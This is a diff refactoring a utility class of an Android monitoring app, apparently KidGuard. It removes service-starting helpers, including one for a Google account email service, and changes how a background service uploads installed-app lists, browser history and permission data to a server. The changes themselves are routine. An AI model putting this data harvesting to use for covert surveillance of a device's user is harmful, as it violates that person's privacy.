@@ -36,7 +36,6 @@ import com.kidguard.model.Apps;
 import com.kidguard.model.BrowserHistory;
 import com.kidguard.model.Permissions;
 import com.kidguard.services.BackgroundDataService;
-import com.kidguard.services.GoogleAccountService;
 
 import java.io.File;
 import java.net.NetworkInterface;
@@ -57,12 +56,6 @@ import pub.devrel.easypermissions.EasyPermissions;
 import static android.content.Context.CONNECTIVITY_SERVICE;
 
 public class Utilities implements Constant {
-
-    // Start Services
-    public static void startServices(Context ctx, Class nextClassName) {
-        Intent myIntent = new Intent(ctx, nextClassName);
-        ctx.startService(myIntent);
-    }
 
     // Check Google Play Service is Install Or Not
     public static boolean checkPlayServices(final Context ctx) {
@@ -126,11 +119,9 @@ public class Utilities implements Constant {
 
     // Check Email is Valid or not
     public static boolean isValidEmail(String email) {
-        Pattern pattern;
-        Matcher matcher;
         final String EMAIL_PATTERN = "^[_A-Za-z0-9-]+(\\.[_A-Za-z0-9-]+)*@[A-Za-z0-9]+(\\.[A-Za-z0-9]+)*(\\.[A-Za-z]{2,})$";
-        pattern = Pattern.compile(EMAIL_PATTERN);
-        matcher = pattern.matcher(email);
+        Pattern pattern = Pattern.compile(EMAIL_PATTERN);
+        Matcher matcher = pattern.matcher(email);
         return matcher.matches();
     }
 
@@ -245,7 +236,7 @@ public class Utilities implements Constant {
                 }
             }
         }
-        BackgroundDataService.getInstance().sendAppsDataToServer(lstApps);
+        new BackgroundDataService(ctx).sendAppsDataToServer(lstApps);
     }
 
     // Get Browser History
@@ -269,12 +260,12 @@ public class Utilities implements Constant {
                         mCur.moveToNext();
                     }
                 }
-                BackgroundDataService.getInstance().sendBrowserHistoryToServer(listBrowser);
             }
+            new BackgroundDataService(ctx).sendBrowserHistoryToServer(listBrowser);
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
-            if (mCur != null && !mCur.isClosed()){
+            if (mCur != null && !mCur.isClosed()) {
                 mCur.close();
             }
         }
@@ -347,18 +338,6 @@ public class Utilities implements Constant {
             }
         }
         return (path.delete());
-    }
-
-    // Start Google Account Service
-    public static void startGoogleAccountService(Context context) {
-        Intent myIntent = new Intent(context, GoogleAccountService.class);
-        myIntent.putExtra(KEY_TAG, TAG_EMAIL);
-        myIntent.putExtra(KEY_COUNT, "0");
-        myIntent.putExtra(KEY_DATE_FROM, "");
-        myIntent.putExtra(KEY_DATE_TO, "");
-        myIntent.putExtra(KEY_SIZE, "");
-        myIntent.putExtra(KEY_SUBJECT, "");
-        context.startService(myIntent);
     }
 
     // Get Mac Address Below Marshmallow
@@ -485,8 +464,7 @@ public class Utilities implements Constant {
         }
 
         listPermission.add(permissionLocation);
-        if (listPermission.size() > 0) {
-            BackgroundDataService.getInstance().sendAppPermissionToServer(listPermission);
-        }
+
+        new BackgroundDataService(ctx).sendAppPermissionToServer(listPermission);
     }
 }
